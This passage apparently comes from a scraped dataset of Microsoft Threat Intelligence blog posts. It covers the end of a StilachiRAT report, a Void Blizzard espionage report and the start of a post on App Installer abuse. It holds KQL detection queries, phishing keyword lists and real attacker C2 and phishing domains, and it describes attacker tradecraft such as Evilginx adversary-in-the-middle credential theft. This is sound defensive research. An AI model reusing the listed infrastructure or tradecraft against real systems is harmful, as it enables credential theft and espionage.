ports associated with common data transfer protocols such as HTTP/HTTPS (port 80/443), SMB (port 445), and DNS (port 53) or less common ports like 16000 used for specific applications and services for network communications might indicate such activity.\nlet domains = dynamic(['domain1', 'domain2', 'domain3']); DeviceNetworkEvents | where RemotePort in (53, 443, 16000) | where Protocol == \"Tcp\" | where RemoteUrl has_any (domains) | project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessCommandLine, ActionType, DeviceId, LocalIP, RemoteUrl, InitiatingProcessFileName Look for signs of persistence The malware can be run both as a Windows Service or a standalone component.\nTo identify persistence and suspicious services, monitor for the following event IDs: - Event ID 7045 – a new service was installed on the system.\nMonitor for suspicious services. -\nEvent ID 7040 – start type of a service is changed (boot, on-request).\nBoot may be a vector for the RAT to persist during a system reboot.\nOn request indicates that the process must request the SCM to start the service. -\nCorrelated with Event ID 4697 – a service was installed on the system (Security log) DeviceEvents |where ActionType == “ServiceInstalled” | project Timestamp, DeviceId,ActionType, FileName, FolderPath, InitiatingProcessCommandLine Look for anti-forensic behavior To identify potential event log clearing, monitor for the following event IDs: - Event ID 1102 (Security log) - Event ID 104 (System log) Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain/IP/Hash indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nAdditionally, Sentinel users can use the following query to detect when the security event log has been cleared, a potential indicator of an attempt to erase system evidence.\nSecurityEvent | where EventID == 1102 and EventSourceName == \"Microsoft-Windows-Eventlog\" | summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), EventCount = count() by Computer, Account, EventID, Activity | extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex !\n= -1, substring(Computer, DomainIndex + 1), Computer) | extend AccountName = tostring(split(Account, @'\\')[1]), AccountNTDomain = tostring(split(Account, @'\\')[0]) Sentinel users can also use the following query to detect service installations or modifications in service settings, which may indicate potential persistence mechanisms used by attackers.\nEvent // 7045: A service was installed in the system // 7040: A service setting has been changed | where Source == \"Service Control Manager\" | where EventID in ( '7045', '7040') | parse EventData with * 'ServiceName\">' ServiceName \"<\" * 'ImagePath\">' ImagePath \"<\" * | parse EventData with * 'AccountName\">' AccountName \"<\" * | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, ServiceName, ImagePath, AccountName Indicators of compromise | Indicator | Type | Description | | 394743dd67eb018b02e069e915f64417bc1cd8b33e139b92240a8cf45ce10fcb | SHA-256 | WWStartupCtrl64.dll | | 194.195.89[.]47 | IP address | C2 | | app.95560[.]cc | Domain name | C2 | Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on LinkedIn at https://www.linkedin.com/showcase/microsoft-threat-intelligence, and on X (formerly Twitter) at https://x.com/MsftSecIntel.\nTo hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: https://thecyberwire.com/podcasts/microsoft-threat-intelligence.\nMicrosoft is committed to delivering comprehensive customer experience through various Microsoft Offerings.\nOur approach goes beyond traditional support by focusing on detection, prevention, and in-depth mitigation to help customers quickly respond to security incidents and build resiliency.\nWant to know how to Build a More Secure Tomorrow?\nCheck our Unified and Security eBook and visit https://aka.ms/Unified Dmitriy Pletnev and Daria Pop Microsoft Incident Response","num_sentences":122,"metadata":{"source":"blog","platform":"Microsoft","filename":"StilachiRAT"}}
{"id":53,"title":"New Russia-affiliated actor Void Blizzard targets critical sectors for espionage | Microsoft Security Blog","publish_date":"2024-04-28","link":"https://www.microsoft.com/en-us/security/blog/2025/05/27/new-russia-affiliated-actor-void-blizzard-targets-critical-sectors-for-espionage/","clean_text":"Executive summary: Void Blizzard is a new threat actor Microsoft Threat Intelligence has observed conducting espionage operations primarily targeting organizations that are important to Russian government objectives.\nThese include organizations in government, defense, transportation, media, NGOs, and healthcare, especially in Europe and North America.\nThey often use stolen sign-in details that they likely buy from online marketplaces to gain access to organizations.\nOnce inside, they steal large amounts of emails and files.\nIn April 2025, Microsoft Threat Intelligence observed Void Blizzard begin using more direct methods to steal passwords, such as sending fake emails designed to trick people into giving away their login information.\nWe thank our partners at Netherlands General Intelligence and Security Service (AIVD) and the Netherlands Defence Intelligence and Security Service (MIVD) for the collaboration on investigating Void Blizzard (also known as LAUNDRY BEAR).\nYou can read their statement here.\nWe also thank our partners at the US Federal Bureau of Investigation for their continued collaboration on investigating Void Blizzard targeting.\nMicrosoft Threat Intelligence Center has discovered a cluster of worldwide cloud abuse activity conducted by a threat actor we track as Void Blizzard (LAUNDRY BEAR), who we assess with high confidence is Russia-affiliated and has been active since at least April 2024.\nWhile Void Blizzard has a global reach, their cyberespionage activity disproportionately targets NATO member states and Ukraine, indicating that the actor is likely collecting intelligence to help support Russian strategic objectives.\nIn particular, the threat actor’s prolific activity against networks in critical sectors poses a heightened risk to NATO member states and allies to Ukraine in general.\nVoid Blizzard’s cyberespionage operations tend to be highly targeted at specific organizations of interest to the Russian government, including in government, defense, transportation, media, non-governmental organizations (NGOs), and healthcare sectors primarily in Europe and North America.\nThe threat actor uses stolen credentials—which are likely procured from commodity infostealer ecosystems—and collects a high volume of email and files from compromised organizations.\nIn April 2025, Microsoft Threat Intelligence Center observed Void Blizzard evolving their initial access techniques to include targeted spear phishing for credential theft.\nWhile Void Blizzard’s tactics, techniques, and procedures (TTPs) are not unique among advanced persistent threat actors or even Russian nation state-sponsored groups, the widespread success of their operations underscores the enduring threat from even unsophisticated TTPs when leveraged by determined actors seeking to collect sensitive information.\nIn this report, we share our analysis of Void Blizzard’s targeting and TTPs, with the goal of enabling the broader community to apply specific detections and mitigation guidance to disrupt and protect against Void Blizzard’s operations.\nWe extend our gratitude to our partners at the Netherlands General Intelligence and Security Service (AIVD), the Netherlands Defence Intelligence and Security Service (MIVD), and the US Federal Bureau of Investigation for their collaboration in investigating and raising awareness on Void Blizzard activity and tooling to help organizations disrupt and defend against this threat actor.\nVoid Blizzard targets Void Blizzard primarily targets NATO member states and Ukraine.\nMany of the compromised organizations overlap with past—or, in some cases, concurrent—targeting by other well-known Russian state actors, including Forest Blizzard, Midnight Blizzard, and Secret Blizzard.\nThis intersection suggests shared espionage and intelligence collection interests assigned to the parent organizations of these threat actors.\nSince mid-2024, Microsoft Threat Intelligence has observed Void Blizzard targeting the following industry verticals, many resulting in successful compromises: - Communications/Telecommunications - Defense Industrial Base - Healthcare - Education - Government agencies and services - Information technology - Intergovernmental organizations - Media - NGOs - Transportation Void Blizzard regularly targets government organizations and law enforcement agencies, particularly in NATO member states and especially in countries that provide direct military or humanitarian support to Ukraine.\nWithin Ukraine, Void Blizzard has successfully compromised organizations in multiple sectors, including education, transportation, and defense.\nIn October 2024, Void Blizzard compromised several user accounts at a Ukrainian aviation organization that had been previously targeted by Russian General Staff Main Intelligence Directorate (GRU) actor Seashell Blizzard in 2022.\nThis targeting overlap reflects Russia’s long-standing interest in this organization and, more broadly, in aviation-related organizations since Russia’s invasion of Ukraine in 2022.\nIn 2023, another GRU actor, Forest Blizzard, targeted a prominent aviation organization in Ukraine, and since at least August 2024, it has conducted increasing password spray attacks against several NATO member states’ air traffic control providers.\nTools, tactics, and procedures Initial access Void Blizzard conducts opportunistic yet targeted high-volume cyberoperations against targets of intelligence value to the Russian government.\nTheir operations predominately leverage unsophisticated techniques for initial access such as password spray and using stolen authentication credentials.\nMicrosoft assesses that Void Blizzard procures cookies and other credentials through criminal ecosystems.\nThese credentials are then used to gain access to Exchange and sometimes SharePoint Online for information collection.\nIn April 2025, we identified a Void Blizzard adversary-in-the-middle (AitM) spear phishing campaign that targeted over 20 NGO sector organizations in Europe and the United States.\nThe threat actor used a typosquatted domain to spoof the Microsoft Entra authentication portal.\nUse of a typosquatted domain to spoof Microsoft Entra authentication was a newly observed initial access tactic for this threat actor.\nThis new tactic suggests that Void Blizzard is augmenting their opportunistic but focused access operations with a more targeted approach, increasing the risk for organizations in critical sectors.\nIn this campaign, the threat actor posed as an organizer from the European Defense and Security Summit and sent emails containing messages with a PDF attachment that lured targets with a fake invitation to the Summit.\nThe attachment contained a malicious QR code that redirected to Void Blizzard infrastructure micsrosoftonline[.]com, which hosts a credential phishing page spoofing the Microsoft Entra authentication page.\nWe assess that Void Blizzard is using the open-source attack framework Evilginx to conduct the AitM phishing campaign and steal authentication data, including the input username and password and any cookies generated by the server.\nEvilginx, publicly released in 2017, was the first widely available phishing kit with AitM capabilities.\nPost-compromise activity Despite the lack of sophistication in their initial access methods, Void Blizzard has been effective in gaining access to and collecting information from compromised organizations in critical sectors.\nAfter gaining initial access, Void Blizzard abuses legitimate cloud APIs, such as Exchange Online and Microsoft Graph, to enumerate users’ mailboxes, including any shared mailboxes, and cloud-hosted files.\nOnce accounts are successfully compromised, the actor likely automates the bulk collection of cloud-hosted data (primarily email and files) and any mailboxes or file shares that the compromised user can access, which can include mailboxes and folders belonging to other users who have granted other users read permissions.\nIn a small number of Void Blizzard compromises, Microsoft Threat Intelligence has also observed the threat actor accessing Microsoft Teams conversations and messages via the Microsoft Teams web client application.\nThe threat actor has also in some cases enumerated the compromised organization’s Microsoft Entra ID configuration using the publicly available AzureHound tool to gain information about the users, roles, groups, applications, and devices belonging to that tenant.\nMitigation and protection guidance Microsoft Threat Intelligence recommends organizations that are most likely at risk, primarily those in critical sectors including government and defense, to implement the following recommendations to mitigate against Void Blizzard activity: Hardening identity and authentication - Implement a sign-in risk policy to automate response to risky sign-ins.\nA sign-in risk represents the probability that a given authentication request isn’t authorized by the identity owner.\nA sign-in risk-based policy can be implemented by adding a sign-in risk condition to Conditional Access policies that evaluate the risk level of a specific user or group.\nBased on the risk level (high/medium/low), a policy can be configured to block access or force multi-factor authentication. -\nWhen a user is a high risk and Conditional access evaluation is enabled, the user’s access is revoked, and they are forced to re-authenticate. -\nFor regular activity monitoring, use Risky sign-in reports, which surface attempted and successful user access activities where the legitimate owner might not have performed the sign-in. -\nRequire multifactor authentication (MFA).\nWhile certain attacks attempt to circumvent MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats. -\nLeverage phishing-resistant authentication methods such as FIDO Tokens, or Microsoft Authenticator with passkey.\nAvoid telephony-based MFA methods to avoid risks associated with SIM-jacking. -\nCentralize your organization’s identity management into a single platform.\nIf your organization is a hybrid environment, integrate your on-premises directories with your cloud directories.\nIf your organization is using a third-party for identity management, ensure this data is being logged in a SIEM or connected to Microsoft Entra to fully monitor for malicious identity access from a centralized location.\nThe added benefits to centralizing all identity data is to facilitate implementation of Single Sign On (SSO) and provide users with a more seamless authentication process, as well as configure Microsoft Entra ID’s machine learning models to operate on all identity data, thus learning the difference between legitimate access and malicious access quicker and easier.\nIt is recommended to synchronize all user accounts except administrative and high privileged ones when doing this to maintain a boundary between the on-premises environment and the cloud environment, in case of a breach. -\nSecure accounts with credential hygiene: practice the principle of least privilege and audit privileged account activity in your Entra ID environments to slow and stop attackers.\nHardening email security - Manage mailbox auditing to ensure actions performed by mailbox owners, delegates, and admins are automatically logged.\nNew mailboxes should already have this feature turned on by default. -\nRun a non-owner mailbox access report in the Exchange Admin Center to detect unauthorized access onto a mailbox.\nHardening against post-compromise activity - If a breach or compromise via commodity info stealer is suspected, ensure that any accounts that may have been accessed by that machine have their credentials rotated in addition to removing the malware.\nGiven the widespread use of infostealers in attacks, organizations should immediately respond to infostealer activity and mitigate the risk of credential theft to prevent follow-on malicious activity. -\nConduct an audit search in the Microsoft Graph API for anomalous activity. -\nCreate Defender for Cloud Apps anomaly detection policies. -\nPrevent, detect or investigate possible token theft activity by reviewing mitigation techniques. -\nIf you suspect password spray activity against your organization’s networks, you can refer to this guide for password spray investigation.\nMicrosoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below.\nMicrosoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.\nCustomers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.\nMicrosoft Defender for Endpoint The following alert indicates threat actor activity related to Void Blizzard.\nNote, however, that this alert can be also triggered by Void Blizzard activity that is not related to the activity covered in this report. -\nVoid Blizzard activity The following alerts might indicate credential theft activity related to Void Blizzard utilizing commodity information stealers or conducting password spraying techniques.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nInformation stealing malware activity - Password spraying Microsoft Defender for Identity The following Microsoft Defender for Identity alerts can indicate associated threat activity.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nPassword Spray - Unfamiliar Sign-in properties - Atypical travel - Suspicious behavior: Impossible travel activity Microsoft Defender for Cloud Apps The following Microsoft Defender for Cloud Apps alerts can indicate associated threat activity.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nImpossible travel - Activity from suspicious IP addresses - Unusual activities (by user) Microsoft Defender for Cloud The following alerts might also indicate threat activity associated with this threat.\nThese alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report. -\nAzureHound tool invocation detected - Communication with possible phishing domain - Communication with suspicious domain identified by threat intelligence Microsoft Entra ID Protection The following Microsoft Entra ID Protection risk detections inform Entra ID user risk events and can indicate associated threat activity, including unusual user activity consistent with known attack patterns identified by Microsoft Threat Intelligence research.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nAnomalous Token (sign-in) (RiskEventType: anomalousToken) - Password spray (RiskEventType: passwordSpray) - Anomalous Token (user) (RiskEventType: anomalousToken) - Attacker in the Middle (RiskEventType: attackerinTheMiddle) - Activity from Anonymous IP address (RiskEventType: anonymizedIPAddress) - Microsoft Entra threat intelligence (sign-in): (RiskEventType: investigationsThreatIntelligence) - Suspicious API Traffic (RiskEventType: suspiciousAPITraffic) Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following pre-built promptbooks to automate incident response or investigation tasks related to this threat: - Incident investigation - Microsoft User analysis - Threat actor profile - Threat Intelligence 360 report based on MDTI article - Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.\nThreat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog.\nThese reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.\nMicrosoft Defender Threat Intelligence - Void Blizzard Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor.\nHunting queries Microsoft Defender XDR Microsoft Defender XDR customers can find related Void Blizzard spear phishing activity related to this threat in their networks by running the following queries.\nPossible phishing email targets The following query can help identify possible email targets of Void Blizzard’s spear phishing attempts EmailEvents | where SenderFromDomain in~ (\"ebsumrnit.eu\") | project SenderFromDomain, SenderFromAddress, RecipientEmailAddress, Subject, Timestamp Communication with Void Blizzard domain The following query can help surface devices that might have communicated with Void Blizzard’s spear phishing domain: let domainList = dynamic([\"micsrosoftonline.com\", \"outlook-office.micsrosoftonline.com\"]); union ( DnsEvents | where QueryType has_any(domainList) or Name has_any(domainList) | project TimeGenerated, Domain = QueryType, SourceTable = \"DnsEvents\" ), ( IdentityQueryEvents | where QueryTarget has_any(domainList) | project Timestamp, Domain = QueryTarget, SourceTable = \"IdentityQueryEvents\" ), ( DeviceNetworkEvents | where RemoteUrl has_any(domainList) | project Timestamp, Domain = RemoteUrl, SourceTable = \"DeviceNetworkEvents\" ), ( DeviceNetworkInfo | extend DnsAddresses = parse_json(DnsAddresses), ConnectedNetworks = parse_json(ConnectedNetworks) | mv-expand DnsAddresses, ConnectedNetworks | where DnsAddresses has_any(domainList) or ConnectedNetworks.\nName has_any(domainList) | project Timestamp, Domain = coalesce(DnsAddresses, ConnectedNetworks.\nName), SourceTable = \"DeviceNetworkInfo\" ), ( VMConnection | extend RemoteDnsQuestions = parse_json(RemoteDnsQuestions), RemoteDnsCanonicalNames = parse_json(RemoteDnsCanonicalNames) | mv-expand RemoteDnsQuestions, RemoteDnsCanonicalNames | where RemoteDnsQuestions has_any(domainList) or RemoteDnsCanonicalNames has_any(domainList) | project TimeGenerated, Domain = coalesce(RemoteDnsQuestions, RemoteDnsCanonicalNames), SourceTable = \"VMConnection\" ), ( W3CIISLog | where csHost has_any(domainList) or csReferer has_any(domainList) | project TimeGenerated, Domain = coalesce(csHost, csReferer), SourceTable = \"W3CIISLog\" ), ( EmailUrlInfo | where UrlDomain has_any(domainList) | project Timestamp, Domain = UrlDomain, SourceTable = \"EmailUrlInfo\" ), ( UrlClickEvents | where Url has_any(domainList) | project Timestamp, Domain = Url, SourceTable = \"UrlClickEvents\" ) | order by TimeGenerated desc Microsoft Sentinel The Microsoft blog Web Shell Threat Hunting with Azure Sentinel provides hunting queries and techniques for Sentinel-specific threat hunting.\nSeveral hunting queries are also available below.\nNOTE: Microsoft Sentinel customers can use the following queries to detect phishing attempts and email exfiltration attempts via Graph API.\nWhile these queries are not specific to threat actors, they can help you stay vigilant and safeguard your organization from phishing attacks.\nThese queries search for a week’s worth of events.\nTo explore up to 30 days’ worth of raw data to inspect events in your network and locate potentially related indicators for more than a week, go to the Advanced hunting page > Query tab, select the calendar dropdown menu to update your query to hunt for the Last 30 days.\nIf a query provides high value insights into possible malicious or otherwise anomalous behavior, you can create a custom detection rule based on that query and surface those insights as custom alerts.\nTo do this in the Defender XDR portal, run the query in the Advanced hunting page and select Create detection rule.\nTo do this in the Sentinel portal, use hunting capabilities to run and view the query’s results, then select New alert rule > Create Microsoft Sentinel alert.\nCampaign with suspicious keywords In this detection, we track emails with suspicious keywords in subjects.\nlet PhishingKeywords = () {pack_array(\"account\", \"alert\", \"bank\", \"billing\", \"card\", \"change\", \"confirmation\",\"login\", \"password\", \"mfa\", \"authorize\", \"authenticate\", \"payment\", \"urgent\", \"verify\", \"blocked\");}; EmailEvents | where Timestamp > ago(1d) | where EmailDirection == \"Inbound\" | where DeliveryAction == \"Delivered\" | where isempty(SenderObjectId) | where Subject has_any (PhishingKeywords()) Determine successfully delivered phishing emails to Inbox/Junk folder This query identifies threats which got successfully delivered to Inbox/Junk folder.\nEmailEvents | where isnotempty(ThreatTypes) and DeliveryLocation in~ (\"Inbox/folder\",\"Junk folder\") | extend Name = tostring(split(SenderFromAddress, '@', 0)[0]), UPNSuffix = tostring(split(SenderFromAddress, '@', 1)[0]) | extend Account_0_Name = Name | extend Account_0_UPNSuffix = UPNSuffix | extend IP_0_Address = SenderIPv4 | extend MailBox_0_MailboxPrimaryAddress = RecipientEmailAddress Successful sign-in from phishing link This content is employed to correlate with Microsoft Defender XDR phishing-related alerts.\nIt focuses on instances where a user successfully connects to a phishing URL from a non-Microsoft network device and subsequently makes successful sign-in attempts from the phishing IP address.\nlet Alert_List= dynamic([ \"Phishing link click observed in Network Traffic\", \"Phish delivered due to an IP allow policy\", \"A potentially malicious URL click was detected\", \"High Risk Sign-in Observed in Network Traffic\", \"A user clicked through to a potentially malicious URL\", \"Suspicious network connection to AitM phishing site\", \"Messages containing malicious entity not removed after delivery\", \"Email messages containing malicious URL removed after delivery\", \"Email reported by user as malware or phish\", \"Phish delivered due to an ETR override\", \"Phish not zapped because ZAP is disabled\"]); SecurityAlert | where AlertName in~ (Alert_List) //Findling Alerts which has the URL | where Entities has \"url\" //extracting Entities | extend Entities = parse_json(Entities) | mv-apply Entity = Entities on ( where Entity.\nType == 'url' | extend EntityUrl = tostring(Entity.\nUrl) ) | summarize Url=tostring(tolower(take_any(EntityUrl))), AlertTime= min(TimeGenerated), make_set(SystemAlertId, 100) by ProductName, AlertName // matching with 3rd party network logs and 3p Alerts | join kind= inner (CommonSecurityLog | where DeviceVendor has_any (\"Palo Alto Networks\", \"Fortinet\", \"Check Point\", \"Zscaler\") | where DeviceProduct startswith \"FortiGate\" or DeviceProduct startswith \"PAN\" or DeviceProduct startswith \"VPN\" or DeviceProduct startswith \"FireWall\" or DeviceProduct startswith \"NSSWeblog\" or DeviceProduct startswith \"URL\" | where DeviceAction !\n= \"Block\" | where isnotempty(RequestURL) | project 3plogTime=TimeGenerated, DeviceVendor, DeviceProduct, Activity, DestinationHostName, DestinationIP, RequestURL=tostring(tolower(RequestURL)), MaliciousIP, SourceUserName=tostring(tolower(SourceUserName)), IndicatorThreatType, ThreatSeverity, ThreatConfidence, SourceUserID, SourceHostName) on $left.\nUrl == $right.\nRequestURL // matching successful Login from suspicious IP | join kind=inner (SigninLogs //filtering the Successful Login | where ResultType == 0 | project IPAddress, SourceSystem, SigniningTime= TimeGenerated, OperationName, ResultType, ResultDescription, AlternateSignInName, AppDisplayName, AuthenticationRequirement, ClientAppUsed, RiskState, RiskLevelDuringSignIn, UserPrincipalName=tostring(tolower(UserPrincipalName)), Name = tostring(split(UserPrincipalName, \"@\")[0]), UPNSuffix =tostring(split(UserPrincipalName, \"@\")[1])) on $left.\nDestinationIP == $right.\nIPAddress and $left.\nSourceUserName == $right.\nUserPrincipalName | where SigniningTime between ((AlertTime - 6h) .. (AlertTime + 6h)) and 3plogTime between ((AlertTime - 6h) .. (AlertTime + 6h)) Phishing link click observed in network traffic The purpose of this content is to identify successful phishing links accessed by users.\nOnce a user clicks on a phishing link, we observe successful network activity originating from non-Microsoft network devices.\n//Finding MDO Security alerts and extracting the Entities user, Domain, Ip, and URL.\nlet Alert_List= dynamic([ \"Phishing link click observed in Network Traffic\", \"Phish delivered due to an IP allow policy\", \"A potentially malicious URL click was detected\", \"High Risk Sign-in Observed in Network Traffic\", \"A user clicked through to a potentially malicious URL\", \"Suspicious network connection to AitM phishing site\", \"Messages containing malicious entity not removed after delivery\", \"Email messages containing malicious URL removed after delivery\", \"Email reported by user as malware or phish\", \"Phish delivered due to an ETR override\", \"Phish not zapped because ZAP is disabled\"]); SecurityAlert |where ProviderName in~ (\"Office 365 Advanced Threat Protection\", \"OATP\") | where AlertName in~ (Alert_List) //extracting Alert Entities | extend Entities = parse_json(Entities) | mv-apply Entity = Entities on ( where Entity.\nType == 'account' | extend EntityUPN = iff(isempty(Entity.\nUserPrincipalName), tostring(strcat(Entity.\nName, \"@\", tostring (Entity.\nUPNSuffix))), tostring(Entity.\nUserPrincipalName)) ) | mv-apply Entity = Entities on ( where Entity.\nType == 'url' | extend EntityUrl = tostring(Entity.\nUrl) ) | summarize AccountUpn=tolower(tostring(take_any(EntityUPN))),Url=tostring(tolower(take_any(EntityUrl))),AlertTime= min(TimeGenerated)by SystemAlertId, ProductName // filtering 3pnetwork devices | join kind= inner (CommonSecurityLog | where DeviceVendor has_any (\"Palo Alto Networks\", \"Fortinet\", \"Check Point\", \"Zscaler\") | where DeviceAction !\n= \"Block\" | where DeviceProduct startswith \"FortiGate\" or DeviceProduct startswith \"PAN\" or DeviceProduct startswith \"VPN\" or DeviceProduct startswith \"FireWall\" or DeviceProduct startswith \"NSSWeblog\" or DeviceProduct startswith \"URL\" | where isnotempty(RequestURL) | where isnotempty(SourceUserName) | extend SourceUserName = tolower(SourceUserName) | project 3plogTime=TimeGenerated, DeviceVendor, DeviceProduct, Activity, DestinationHostName, DestinationIP, RequestURL=tostring(tolower(RequestURL)), MaliciousIP, Name = tostring(split(SourceUserName,\"@\")[0]), UPNSuffix =tostring(split(SourceUserName,\"@\")[1]), SourceUserName, IndicatorThreatType, ThreatSeverity,AdditionalExtensions, ThreatConfidence)on $left.\nUrl == $right.\nRequestURL and $left.\nAccountUpn == $right.\nSourceUserName // Applied the condition where alert trigger 1st and then the 3p Network activity execution | where AlertTime between ((3plogTime - 1h) .. (3plogTime + 1h)) Suspicious URL clicked This query correlates Microsoft Defender for Office 365 signals and Microsoft Entra ID identity data to find the relevant endpoint event BrowerLaunchedToOpen in Microsoft Defender ATP.\nThis event reflects relevant clicks on the malicious URL in the spear phishing email recognized by Microsoft Defender for Office 365. //\nSome URLs are wrapped with SafeLinks // Let's get the unwrapped URL and clicks AlertInfo | where ServiceSource =~ \"Microsoft Defender for Office 365\" | join ( AlertEvidence | where EntityType ==\"Url\" | project AlertId, RemoteUrl ) on AlertId | join ( AlertEvidence | where EntityType ==\"MailMessage\" | project AlertId, NetworkMessageId ) on AlertId // Get the unique NetworkMessageId for the email containing the Url | distinct RemoteUrl, NetworkMessageId | join EmailEvents on NetworkMessageId // Get the email RecipientEmailAddress and ObjectId from the email | distinct RemoteUrl, NetworkMessageId, RecipientEmailAddress , RecipientObjectId | join kind = inner IdentityInfo on $left.\nRecipientObjectId == $right.\nAccountObjectId // get the UserSid of the Recipient | extend OnPremSid = AccountSID | distinct RemoteUrl, NetworkMessageId, RecipientEmailAddress , RecipientObjectId, OnPremSid // Get the Url click event on the recipient device.\n| join kind = inner (DeviceEvents | where ActionType == \"BrowserLaunchedToOpenUrl\"| where isnotempty(RemoteUrl) | project UrlDeviceClickTime = Timestamp , UrlClickedByUserSid = RemoteUrl, InitiatingProcessAccountSid, DeviceName, DeviceId, InitiatingProcessFileName ) on $left.\nOnPremSid == $right.\nInitiatingProcessAccountSid and $left.\nRemoteUrl == $right.\nUrlClickedByUserSid | distinct UrlDeviceClickTime, RemoteUrl, NetworkMessageId, RecipientEmailAddress, RecipientObjectId, OnPremSid, UrlClickedByUserSid, DeviceName, DeviceId, InitiatingProcessFileName | sort by UrlDeviceClickTime desc Anomalies in MailItemAccess by GraphAPI This query looks for anomalies in mail item access events made by Graph API.\nIt uses standard deviation to determine if the number of events is anomalous.\nlet starttime = 30d; let STDThreshold = 2.5; let allMailAccsessByGraphAPI = CloudAppEvents | where ActionType == \"MailItemsAccessed\" | where Timestamp between (startofday(ago(starttime))..now()) | where isnotempty(RawEventData['ClientAppId'] ) and RawEventData['AppId'] has \"00000003-0000-0000-c000-000000000000\" | extend ClientAppId = tostring(RawEventData['ClientAppId']) | extend OperationCount = toint(RawEventData['OperationCount']) | project Timestamp,OperationCount , ClientAppId; let calculateNumberOfMailPerDay = allMailAccsessByGraphAPI | summarize NumberOfMailPerDay =sum(toint(OperationCount)) by ClientAppId,format_datetime(Timestamp, 'y-M-d'); let calculteAvgAndStdev=calculateNumberOfMailPerDay | summarize avg=avg(NumberOfMailPerDay),stev=stdev(NumberOfMailPerDay) by ClientAppId; calculteAvgAndStdev | join calculateNumberOfMailPerDay on ClientAppId | sort by ClientAppId | where NumberOfMailPerDay > avg + STDThreshold * stev | project ClientAppId,Timestamp,NumberOfMailPerDay,avg,stev Indicators of compromise | Indicator | Type | Description | | micsrosoftonline[.]com | Domain | Actor-controlled spear-phishing domain (Evilginx) | | ebsumrnit[.]eu | Domain | Actor-controlled spear-phishing domain (malicious sender) | | outlook-office[.]micsrosoftonline[.]com | Domain | Actor controlled spear-phishing domain | | 06a5bd9cb3038e3eec1c68cb34fc3f64933dba2983e39a0b1125af8af32c8ddb | SHA-256 | Malicious email attachment | Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on LinkedIn at https://www.linkedin.com/showcase/microsoft-threat-intelligence, on X (formerly Twitter) at https://x.com/MsftSecIntel, and on Bluesky at https://bsky.app/profile/threatintel.microsoft.com.\nTo hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: https://thecyberwire.com/podcasts/microsoft-threat-intelligence.","num_sentences":140,"metadata":{"source":"blog","platform":"Microsoft","filename":"Void Blizzard"}}
{"id":54,"title":"Financially motivated threat actors misusing App Installer | Microsoft Security Blog","publish_date":"2023-11-28","link":"https://www.microsoft.com/en-us/security/blog/2023/12/28/financially-motivated-threat-actors-misusing-app-installer/","clean_text":"Since mid-November 2023, Microsoft Threat Intelligence has observed threat actors, including financially motivated actors like Storm-0569, Storm-1113, Sangria Tempest, and Storm-1674, utilizing the ms-appinstaller URI scheme (App Installer) to distribute malware.\nIn addition to ensuring that customers are protected from observed attacker activity, Microsoft investigated the use of App Installer in these attacks.\nIn response to this activity, Microsoft has disabled the ms-appinstaller protocol handler by default.\nThe observed threat actor activity abuses the current implementation of the ms-appinstaller protocol handler as an access vector for malware that may lead to ransomware distribution.\nMultiple cybercriminals are also selling a malware kit as a service that abuses the MSIX file format and ms-appinstaller protocol handler.\nThese threat actors distribute signed malicious MSIX application packages using websites accessed through malicious advertisements for legitimate popular software.\nA second vector of phishing through Microsoft Teams is also in use by Storm-1674.\nThreat actors have likely chosen the ms-appinstaller protocol handler vector because it can bypass mechanisms designed to help keep users safe from malware, such as Microsoft Defender SmartScreen and built-in browser warnings for downloads of executable file formats.\nIn this blog, we provide an analysis of activity by financially motivated threat actors abusing App Installer observed since mid-November 2023.\nThreat actors abusing App Installer since mid-November 2023 Microsoft Threat intelligence observed several actors—including Storm-0569, Storm-1113, Sangria Tempest, and Storm-1674—using App Installer as a point of entry for human-operated ransomware activity.\nThe observed activity includes spoofing legitimate applications, luring users into installing malicious MSIX packages posing as legitimate applications, and evading detections on the initial installation files.\nStorm-0569 At the beginning of December 2023, Microsoft observed Storm-0569 distributing BATLOADER through search engine optimization (SEO) poisoning with sites spoofing legitimate software downloads such as Zoom, Tableau, TeamViewer, and AnyDesk.\nUsers who search for a legitimate software application on Bing or Google may be presented with a landing page spoofing the original software provider’s landing pages that include links to malicious installers through the ms-appinstaller protocol.\nSpoofing and impersonating popular legitimate software is a common social engineering tactic.\nThese software are not affected by the attacks directly, but this 